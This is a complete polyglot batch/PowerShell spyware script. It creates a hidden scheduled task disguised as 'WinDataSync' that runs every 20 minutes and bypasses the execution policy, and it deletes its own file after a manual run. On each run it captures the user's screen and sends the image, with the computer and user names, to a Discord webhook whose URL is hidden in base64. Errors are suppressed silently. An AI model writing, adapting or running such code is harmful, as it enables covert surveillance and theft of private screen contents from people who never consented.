<# :
@echo off
setlocal
:: ================= CONFIG =================
set "W_B64=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NTQ2ODQ3OTcwNzY3NjczNS9MU0NEeUtlMHh4d1Nyb0h5OEJISS1nUXA0TmE3dlowRWJIeFk5MGhxSlZJSmxBLW1ud0JqR0U0eGJ0UkYtWG1tRjhzbA=="
set "TASK_NAME=WinDataSync"
:: ==========================================

:: 1. Force Update Task (Every 20 Mins)
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel% equ 0 schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1

:: Create the task (Hidden)
schtasks /create /tn "%TASK_NAME%" /tr "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex ([System.IO.File]::ReadAllText('%~f0'))\" bg" /sc minute /mo 20 /rl limited /f >nul 2>&1

:: 2. Run immediately (Hidden)
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex ([System.IO.File]::ReadAllText('%~f0'))"

:: 3. Self-Delete (Only on manual run)
if "%~1" neq "bg" (
    timeout /t 1 >nul
    (goto) 2>nul & del "%~f0"
)
exit /b
#>

# --- POWERSHELL LOGIC ---
try {
    $W_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NTQ2ODQ3OTcwNzY3NjczNS9MU0NEeUtlMHh4d1Nyb0h5OEJISS1nUXA0TmE3dlowRWJIeFk5MGhxSlZJSmxBLW1ud0JqR0U0eGJ0UkYtWG1tRjhzbA=="
    $W = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($W_B64))
    $FilePath = "$env:TEMP\.cache_$((Get-Random).ToString()).jpg"

    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
    $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $b = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
    $g = [System.Drawing.Graphics]::FromImage($b)
    $g.CopyFromScreen(0,0,0,0,$b.Size)
    $b.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $g.Dispose(); $b.Dispose()

    if (Test-Path $FilePath) {
        $K = [System.Guid]::NewGuid().ToString()
        $H = @{ 'Content-Type' = "multipart/form-data; boundary=$K" }
        $F = [System.IO.File]::ReadAllBytes($FilePath)
        
        # FIXED: Use an object and ConvertTo-Json to avoid quote errors
        $PayloadObj = @{ content = "Snapshot: $env:COMPUTERNAME ($env:USERNAME)" }
        $JSON = $PayloadObj | ConvertTo-Json -Compress

        $MS = New-Object System.IO.MemoryStream
        $SW = New-Object System.IO.StreamWriter($MS)
        
        $SW.Write("--$K`r`nContent-Disposition: form-data; name=`"payload_json`"`r`n`r`n$JSON`r`n--$K`r`nContent-Disposition: form-data; name=`"file`"; filename=`"log.jpg`"`r`nContent-Type: image/jpeg`r`n`r`n")
        $SW.Flush()
        $MS.Write($F, 0, $F.Length)
        $SW.Write("`r`n--$K--`r`n")
        $SW.Flush()
        
        Invoke-RestMethod -Uri $W -Method Post -Headers $H -Body $MS.ToArray() | Out-Null
        
        $SW.Dispose(); $MS.Dispose()
        if (Test-Path $FilePath) { Remove-Item $FilePath -Force }
    }
} catch { }
